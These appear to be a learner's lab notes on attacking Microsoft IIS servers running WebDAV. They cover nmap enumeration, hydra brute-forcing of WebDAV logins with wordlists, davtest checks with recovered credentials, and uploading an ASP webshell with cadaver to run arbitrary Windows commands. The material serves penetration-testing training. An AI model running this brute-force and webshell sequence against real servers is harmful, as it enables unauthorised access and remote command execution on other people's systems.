Exploiting microsoft IIS WebDAV
#### Microsoft IIS
- web server developed by microsoft
- used to host websites/web
- it can host both static and dynamic web
- port 80/443
- supports - .asp,.aspx,.config,.php etc
#### WebDAV
- a set of extensions to the HTTP protocol which allow users to collaboratively edit and manage files on remote web servers
- webdav enables a web server to function as file server
- webdav runs on top microsoft IIS on ports 80/443
- need legitimate credentials to connect webdav if authentication enable.

#### Exploitatin process
- confirm if webdav is configured using microsoft IIS by seeing service name and ports  from nmap
- after confirming the service, brute force to identify credentials
- authenticate with webdav and upload malicious files to execute arbitrary commands

#### Tools
- davtest  -- used to scan,authenticate and exploit a webdav server.
-  cadaver -- used to upload,download,on-screen display,in-place editing,move/copy,collection creation,deletion,property manipulation, resource locking on webdav servers.

#### Exploitation
- nmap -sV -sC 10.2.17.124 [ this confirm IIS webdav services]
- nmap -sV -p 80 --script=http-enum 10.2.17.124 [ this show the webdav folders it also shows unauthorised]
- hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt 10.2.17.124 http-get /webdav/ [ here webdav is folder name ]
- davtest -url http://10.2.17.124/webdav -auth bob:password_123321 [ this test what kind of file can be uploaded and executed]
- cadaver http://10.2.17.124/webdav [ this will ask for credentials,we can edit the folder by this tool]
- move new tab and search for kali webshell for uploading  in webdav [ /usr/share/webshells ]
- again move to cadaver "put /usr/share/webshells/asp/webshell.asp"  [ upload a asp shell because we find asp can be executed in webdav ]
- now go to browser http://10.2.17.124/webdav we find all the files.Click webshell.asp which give us an input box where we can put arbitrary windows commands
